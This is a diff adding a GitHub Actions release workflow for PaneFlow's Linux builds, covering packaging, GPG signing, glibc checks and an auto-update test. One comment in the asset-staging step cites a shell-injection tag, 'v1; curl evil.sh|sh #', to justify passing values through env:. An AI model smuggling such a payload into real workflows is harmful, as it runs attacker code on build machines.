@@ -1,0 +1,485 @@
+name: release-linux
+
+# Called by `release.yml`, never on its own.
+# The two Linux legs and the auto-update end-to-end test.
+# It receives only the secrets of its platform, by name. A job that signs
+# declares the `release` environment, whose deployment policy admits `main`
+# and `v*` tags, and the secrets of that environment then replace the empty
+# values a dry-run from another ref passes.
+on:
+  workflow_call:
+    inputs:
+      sha:
+        description: "Commit to build, resolved once by the preflight job"
+        required: true
+        type: string
+      tag:
+        description: "Release tag, v followed by the version"
+        required: true
+        type: string
+      mode:
+        description: "release for a tag push, dry-run for a dispatch"
+        required: true
+        type: string
+      signed:
+        description: "True when the run may use the release environment and its signing secrets"
+        required: true
+        type: boolean
+    secrets:
+      POSTHOG_API_KEY:
+        required: false
+      GPG_PRIVATE_KEY:
+        required: false
+      GPG_PASSPHRASE:
+        required: false
+      GPG_KEY_ID:
+        required: false
+      MINISIGN_SECRET_KEY:
+        required: false
+
+permissions:
+  contents: read
+
+cache-mode: none
+
+defaults:
+  run:
+    shell: bash -euo pipefail {0}
+
+env:
+  CARGO_TERM_COLOR: always
+  RELEASE_TAG: ${{ inputs.tag }}
+  RELEASE_MODE: ${{ inputs.mode }}
+
+jobs:
+  build:
+    name: Build ${{ matrix.target }}
+    runs-on: ${{ matrix.runs-on }}
+    # The Linux binaries are built in Ubuntu 22.04 userland, on a 24.04 host:
+    # the hosted 22.04 images retire on 2027-04-17, and the packages still
+    # promise "Ubuntu 22.04+" (`packaging/debian/postinst`), that is glibc
+    # 2.35. Everything the build links, and everything linuxdeploy copies
+    # into the AppImage, therefore comes from this image, pinned by the
+    # digest of its multi-arch index. The "Require glibc 2.35" step below
+    # fails the leg if a binary asks for a newer symbol version.
+    container:
+      image: ubuntu:22.04@sha256:0e0a0fc6d18feda9db1590da249ac93e8d5abfea8f4c3c0c849ce512b5ef8982
+    timeout-minutes: 55
+    # A dry-run from a ref the `release` environment does not admit runs with
+    # no environment at all: it gets no signing secret, builds unsigned
+    # artifacts, and never trips the deployment policy.
+    environment: ${{ inputs.signed && 'release' || '' }}
+    strategy:
+      # Atomicity comes from the publish job's `needs`, not from cancelling
+      # the sibling leg after 20 minutes of work.
+      fail-fast: false
+      matrix:
+        include:
+          - target: x86_64-unknown-linux-gnu
+            arch: x86_64
+            runs-on: ubuntu-24.04
+          # Hosted ARM runner: no `cross`, no QEMU.
+          - target: aarch64-unknown-linux-gnu
+            arch: aarch64
+            runs-on: ubuntu-24.04-arm
+    steps:
+      - name: Prepare the Ubuntu 22.04 build container
+        # The bare `ubuntu:22.04` image has no git, so `actions/checkout`
+        # would fall back to a tarball with no history, and neither curl nor
+        # sudo, which `fetch-libghostty` and `linux-build-deps` call.
+        run: |
+          apt-get -o Acquire::Retries=3 update
+          apt-get -o Acquire::Retries=3 install -y --no-install-recommends ca-certificates curl git sudo
+
+      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
+        with:
+          persist-credentials: false
+          ref: ${{ inputs.sha }}
+
+      # Every release leg links the published archive for its own target, which
+      # fetch-libghostty verifies against `archive_sha256` in the manifest.
+      # The Linux legs used to rebuild it from the Ghostty source, twice, to
+      # reproduce those same bytes: 12 minutes on the slowest leg.
+      # `libghostty-linux.yml` owns that reproducibility proof, on every
+      # recipe change and every night.
+      - uses: ./.github/actions/fetch-libghostty
+
+      - name: Install system dependencies
+        uses: ./.github/actions/linux-build-deps
+        with:
+          container-toolchain: "true"
+          extra-packages: >-
+            binutils
+            elfutils
+            jq
+            patchelf
+            lintian
+            dpkg-sig
+            rpm
+            gnupg
+            appstream
+            imagemagick
+            icnsutils
+
+      # US-002 AC3 - validate the AppStream metainfo XML before any packaging
+      # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
+      # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
+      # would ignore, and (b) block distro submission. Fail-fast here so a
+      # malformed `<releases>` block (e.g., after a version bump that forgot
+      # the `<release>` entry) never makes it into a shipped artifact.
+      - name: Validate AppStream metainfo
+        run: |
+          appstreamcli validate \
+            --no-net \
+            --pedantic \
+            assets/io.github.arthurdev44.paneflow.metainfo.xml
+
+      - name: Verify AppStream release version freshness
+        run: scripts/check-appstream-version.sh
+
+      # Pinned via repo-level `rust-toolchain.toml` (US-001). Use the
+      # `@master` ref + explicit `toolchain` input so the action reads the
+      # same channel everywhere instead of resolving `@stable` at runtime,
+      # which drifts each Rust point release and broke fmt mid-v0.2.11.
+      - uses: dtolnay/rust-toolchain@fa04a1451ff1842e2626ccb99004d0195b455a88
+        with:
+          # Must match `rust-toolchain.toml` channel verbatim. The
+          # workspace dep graph (oo7, cosmic-text, smol_str, wgpu)
+          # requires rustc >= 1.92, so this can't drift below 1.92.
+          toolchain: "1.98.0"
+          components: rustfmt, clippy
+          targets: ${{ matrix.target }}
+
+      - name: Install cargo-deb (pinned)
+        run: cargo install cargo-deb --version 3.6.3 --locked
+
+      - name: Install cargo-generate-rpm (pinned)
+        # Version pinned to the one we validated against the TOML schema in
+        # US-014. Bumping 0.20.0 → anything else requires re-reading the
+        # upstream README: the `assets` inline-table grammar has changed in
+        # prior minor versions.
+        run: cargo install cargo-generate-rpm --version 0.20.0 --locked
+
+      # Regenerate every icon asset (.png hicolor set, .icns, .ico,
+      # rust-embed runtime icon) from the master PNGs under
+      # `assets/icons/master/`. Script is a no-op when no master is present,
+      # so this step is safe to land before the masters are committed.
+      # Placement rationale: runs BEFORE `Build release binary` and all
+      # packaging steps, so cargo-deb / cargo-generate-rpm / bundle-macos.sh
+      # / cargo-wix all see fresh icons from this same checkout.
+      - name: Regenerate icons from master
+        shell: bash
+        run: bash scripts/build-icons.sh
+
+      # --- Release build ---
+      # `POSTHOG_API_KEY` is resolved by `option_env!` at compile time
+      # (see `src-app/src/app/bootstrap.rs`); embedding it here at the
+      # single `cargo build --release` step is sufficient for every
+      # downstream artifact (tar.gz, .deb, .rpm, AppImage, .dmg, and the
+      # cargo-wix MSI which consumes this build via `--no-build`). If the
+      # secret is absent the startup log::warn! surfaces and events are
+      # silently dropped - never a user-facing failure.
+      - name: Build release binary
+        env:
+          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+          # US-002 (prd-audit-remediation): bake the minisign public key(s)
+          # into the binary so the self-updater can verify downloaded
+          # artifacts (option_env! in update/signature.rs). PUBLIC keys →
+          # repository *variables*, never secrets. Two slots (current + next)
+          # for zero-downtime rotation; an unset var resolves to "" which
+          # the verifier treats as "no key in this slot".
+          PANEFLOW_MINISIGN_PUBKEY: ${{ vars.PANEFLOW_MINISIGN_PUBKEY }}
+          PANEFLOW_MINISIGN_PUBKEY_NEXT: ${{ vars.PANEFLOW_MINISIGN_PUBKEY_NEXT }}
+          TARGET: ${{ matrix.target }}
+        run: cargo build --release -p paneflow-app -p paneflow-host --locked --target "$TARGET"
+
+      - name: Verify packaged libghostty identity and static linkage
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          scripts/verify-libghostty-package.sh \
+            --binary "target/$TARGET/release/paneflow" \
+            --notice native/libghostty/THIRD_PARTY_NOTICES.md
+
+      # The supported floor is Ubuntu 22.04, glibc 2.35. A binary that needs a
+      # newer symbol version fails to start there with "version `GLIBC_2.36'
+      # not found", and nothing else in the release would notice: the package
+      # smokes that run it are newer distributions. The three helpers are the
+      # binaries `paneflow` embeds and extracts at run time.
+      - name: Require glibc 2.35 as the highest symbol version
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          scripts/check-glibc-floor.sh 2.35 \
+            "target/$TARGET/release/paneflow" \
+            "target/$TARGET/release/paneflow-host" \
+            "target/embed-build/$TARGET/release-min/paneflow-shim" \
+            "target/embed-build/$TARGET/release-min/paneflow-ai-hook" \
+            "target/embed-build/$TARGET/release-min/paneflow-mcp"
+
+      # The helper caps are defined for Linux x86_64, and these are the bytes
+      # the release embeds: built by `src-app/build.rs` with the 22.04
+      # toolchain of the build container.
+      - name: Helper binary size budget
+        if: matrix.arch == 'x86_64'
+        env:
+          TARGET: ${{ matrix.target }}
+        run: scripts/check-helper-sizes.sh "target/embed-build/$TARGET/release-min"
+
+      # --- Phase 1 artifacts ---
+      - name: Produce tar.gz
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body - same injection-hardening rationale as the
+        # AppImage step below (attacker-controlled tags must not reach bash
+        # via GitHub Actions expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        # `${TAG#v}` strips the leading `v` so the bundled artifact is
+        # `paneflow-<semver>-<arch>.tar.gz` (no `v` prefix), matching the
+        # naming convention macOS and Windows already follow. Until v0.3.0
+        # the Linux assets were `paneflow-v<semver>-<arch>.tar.gz`, a
+        # historical inconsistency that's safe to drop because the in-app
+        # update matcher (`update/checker.rs::pick_asset`) is suffix-only
+        # (`ends_with("-<arch>.tar.gz")`) and version-agnostic.
+        run: bash scripts/bundle-tarball.sh "${TAG#v}"
+
+      - name: Produce .deb
+        run: cargo deb --no-build -p paneflow-app --target ${{ matrix.target }}
+
+      - name: Lintian check
+        run: |
+          lintian \
+            --suppress-tags bad-distribution-in-changes-file \
+            target/${{ matrix.target }}/debian/*.deb
+
+      - name: Produce .rpm
+        # `-p src-app` is the DIRECTORY path (relative to workspace root),
+        # not the crate name - cargo-generate-rpm 0.20.0 resolves `-p`
+        # strictly as a path. `-p paneflow-app` fails with "No such file
+        # or directory: paneflow-app/Cargo.toml".
+        #
+        # `--target` aligns with the earlier cargo-build output dir and
+        # drops the artifact at target/<triple>/generate-rpm/. Source
+        # paths in `[package.metadata.generate-rpm]` that start with
+        # `target/release/` are auto-rewritten to match.
+        run: cargo generate-rpm -p src-app --target ${{ matrix.target }}
+
+      # ─── US-017 GPG signing ────────────────────────────────────────────
+      # Signs the freshly-built .deb and .rpm with the release key
+      # (`GPG_PRIVATE_KEY` secret) so dpkg-sig / rpm --checksig accept
+      # them, and so `dnf install` on an `gpgcheck=1` client succeeds.
+      #
+      # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
+      # The earlier PRD draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
+      # but those produce incompatible signature formats - the verify
+      # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
+      # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
+      # XML required).
+      #
+      # HARD-FAIL contract (AC7): if the GPG_PRIVATE_KEY secret is
+      # missing or malformed, the workflow exits NON-ZERO with the exact
+      # AC-mandated string "GPG signing failed: key not loaded". No
+      # silent-unsigned-release path. The release-creating step at the
+      # end of the job is downstream - it never runs if we exit here.
+      - name: Sign .deb and .rpm with release key
+        env:
+          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+          GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
+          TARGET: ${{ matrix.target }}
+        run: scripts/sign-linux-packages.sh "$TARGET"
+
+      - name: Produce AppImage
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body - same injection-hardening rationale as the
+        # staging step below (attacker-controlled tags must not reach bash
+        # via expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        # `${TAG#v}` strips the leading `v`. See the bundle-tarball
+        # invocation above for the rationale (consistency with macOS/
+        # Windows naming + safe under suffix-only update matcher).
+        run: bash scripts/bundle-appimage.sh "${TAG#v}"
+
+      # --- Stage all 4 artifacts with canonical names ---
+      # Context values are passed via `env:` rather than inlined as
+      # `${{ github.ref_name }}` inside the shell body - otherwise an
+      # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
+      # shell-injected when bash parses the script. `env:` injects them
+      # as environment variables, immune to shell interpretation.
+      - name: Stage release assets
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+          ARCH: ${{ matrix.arch }}
+          TARGET: ${{ matrix.target }}
+        # `VERSION="${TAG#v}"` strips the leading `v` so all Linux assets
+        # are named `paneflow-<semver>-<arch>.<ext>` (no `v` prefix),
+        # aligning with the macOS DMG and Windows MSI naming conventions
+        # already in this workflow. The invariant we MUST preserve is the
+        # filename suffix `-<arch>.<ext>`. That's what
+        # `update/checker.rs::pick_asset` matches on
+        # (`a.name.to_ascii_lowercase().ends_with("-x86_64.deb")` etc.),
+        # so dropping the `v` from the prefix is safe for v0.2.x clients
+        # auto-updating to v0.3.0+.
+        run: scripts/stage-linux-assets.sh "${TAG#v}" "$ARCH" "$TARGET"
+
+      # Upload the artifacts for the package smokes and the publish job of
+      # `release.yml`, and for the auto-update test below.
+      # `compression-level: 0`: the artifacts are already compressed
+      # (.deb/.rpm/.tar.gz/.AppImage).
+      - name: Verify release artifacts staged
+        run: scripts/check-staged-assets.sh
+
+      - name: Upload release artifacts (for smoke-test jobs)
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          # The platform is part of the name: Linux aarch64 and macOS
+          # aarch64 would otherwise collide on `release-assets-aarch64`.
+          # The publish and summary jobs of `release.yml` glob
+          # `release-assets-*`.
+          name: release-assets-${{ matrix.arch }}-Linux
+          path: release-assets/
+          retention-days: 7
+          compression-level: 0
+
+  # ─── US-005: auto-update e2e (publish-gating) ───────────────────────
+  # Builds OLD paneflow at the previous tag in a git worktree, builds
+  # NEW from this checkout, serves a fixture `latest.json` + tarball
+  # via python3's http.server on localhost, then runs OLD with
+  # `--update-and-exit` (US-005 Rust flag) pointing at the fixture.
+  # Three scenarios - happy tar.gz swap, hash-mismatch rejection,
+  # feed-unreachable surfaced as exit 3 - all asserted by the script.
+  #
+  # The publish job of `release.yml` needs this workflow, so a tag cut never ships a binary that
+  # can't actually self-update from the previous release. This is the
+  # ONLY automated test of `src-app/src/update/` - paneflow-app has no
+  # unit tests, so dropping this gate would ship updater regressions
+  # silently. A previous nightly variant (auto_update_e2e.yml on cron)
+  # was deleted 2026-05-27 as redundant with this release gate at the
+  # current ~monthly release cadence.
+  auto-update-e2e:
+    name: Auto-update e2e (Linux x86_64)
+    needs: build
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    # The E2E signs the NEW tarball before publish so it can remain a
+    # hard gate of the publish job. That requires the same minisign secret as
+    # the publish job, stored on the protected `release` environment, which
+    # only `main` and `v*` tags may deploy to. It runs exactly when the build
+    # signs (see `build.environment`), so a `target_ref` other than `main`
+    # never gets the minisign key, and no other ref fails on the policy.
+    if: inputs.signed
+    environment: release
+    # Pre-refactor (≤ v0.3.3): this job did two full `cargo build
+    # --release` (NEW from current tree, OLD from a worktree at the
+    # previous tag), routinely ~20-25 min on cold cache. It was by
+    # far the longest leg of the release pipeline.
+    #
+    # Refactor (2026-05-27): the harness now accepts E2E_NEW_TARBALL
+    # and E2E_OLD_TARBALL env vars and uses them directly when set
+    # (scripts/test-update-e2e.sh). The NEW tarball is reused from
+    # the `build` job's artifact (already built + bundled +
+    # sha256-sided 5 minutes earlier - no point rebuilding). The OLD
+    # tarball is fetched from the previous GitHub release, which is
+    # strictly more faithful than a from-source rebuild: we now test
+    # the exact byte sequence real users have on disk.
+    #
+    # Result: ~2-3 min job (no cargo build, no toolchain install). It does
+    # NOT need Vulkan/Wayland windowing deps since `--update-and-exit` never
+    # opens a GPUI window -- but it DOES need the binary's hard NEEDED shared
+    # libs (libxkbcommon.so.0 + libxkbcommon-x11.so.0, see `readelf -d`),
+    # which the dynamic linker resolves at exec, before main(), regardless of
+    # whether a window opens. See the explicit install step below.
+    steps:
+      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
+        with:
+          persist-credentials: false
+          ref: ${{ inputs.sha }}
+          # Shallow checkout is enough now that the harness no longer
+          # does `git worktree add` for the OLD source.
+          fetch-depth: 1
+
+      # The released binary links libxkbcommon-x11.so.0 + libxkbcommon.so.0
+      # as hard NEEDED entries, so the dynamic linker resolves them at exec
+      # even under `--update-and-exit`. The ubuntu-22.04 runner image stopped
+      # guaranteeing libxkbcommon-x11-0 (the SAME binary deps passed on
+      # 2026-05-27 for v0.3.3 and failed on 2026-05-28 for v0.3.4 with a bare
+      # "cannot open shared object file" exit 127). Install it explicitly so
+      # the job is hermetic against runner-image drift.
+      - name: Install runtime libs the binary links (resolved at exec)
+        run: |
+          scripts/ci-retry-network.sh sudo apt-get update
+          scripts/ci-retry-network.sh sudo apt-get install -y libxkbcommon-x11-0
+
+      # Pull the NEW tarball straight from the `build` job's
+      # x86_64 Linux artifact. The matrix uploads
+      # release-assets-x86_64-Linux which contains every Linux x86_64
+      # artifact (.tar.gz, .deb, .rpm, AppImage, sha256 sidecars); the
+      # harness only consumes paneflow-<ver>-x86_64.tar.gz.
+      - name: Download NEW build artifact
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
+        with:
+          name: release-assets-x86_64-Linux
+          path: ${{ runner.temp }}/e2e-new
+
+      # Fetch the most recent published stable release as OLD. Selecting
+      # the latest non-prerelease ensures the harness exercises the
+      # update path users would actually traverse - never a `-rc.N`
+      # build, which update_cask.yml already keeps out of Homebrew.
+      # If no stable release exists yet (first release
+      # ever, or first after a long pre-release train) the script's
+      # self-bootstrap guard at scripts/test-update-e2e.sh:168 takes
+      # over and exits 0 with a "harness no-op" message.
+      - name: Resolve previous stable release tag
+        id: prev_release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: scripts/resolve-previous-release.sh "$RELEASE_TAG"
+
+      - name: Download OLD release tarball
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          OLD_TAG: ${{ steps.prev_release.outputs.old_tag }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir -p "$RUNNER_TEMP/e2e-old"
+          gh release download "$OLD_TAG" --pattern 'paneflow-*-x86_64.tar.gz' --dir "$RUNNER_TEMP/e2e-old"
+          ls -la "$RUNNER_TEMP/e2e-old"
+
+      # The build artifact predates the publish job's release signing, but
+      # auto-update-e2e gates the publish job. It cannot poll a
+      # GitHub Release that is waiting for this very job. Sign the NEW
+      # tarball here with the same minisign release key so OLD clients can
+      # verify the fixture before publish.
+      - name: Sign NEW tarball for auto-update e2e
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
+        run: scripts/sign-update-e2e-tarball.sh "$RUNNER_TEMP/e2e-new"
+
+      - name: Run auto-update e2e harness
+        if: steps.prev_release.outputs.old_version != ''
+        env:
+          OLD_VERSION: ${{ steps.prev_release.outputs.old_version }}
+        run: scripts/run-update-e2e.sh "$RUNNER_TEMP/e2e-new" "$RUNNER_TEMP/e2e-old"
+
+      - name: Self-bootstrap skip notice
+        if: steps.prev_release.outputs.old_version == ''
+        run: |
+          echo "::notice::No previous stable release published yet - auto-update e2e is a no-op for the first release. Will engage on the next tag cut."
+
+      - name: Upload e2e logs on failure
+        if: failure()
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: auto-update-e2e-logs-${{ github.run_id }}
+          path: |
+            /tmp/paneflow-e2e/*.stdout
+            /tmp/paneflow-e2e/*.stderr
+            /tmp/paneflow-e2e/http-server.log
+          retention-days: 7
+          if-no-files-found: warn
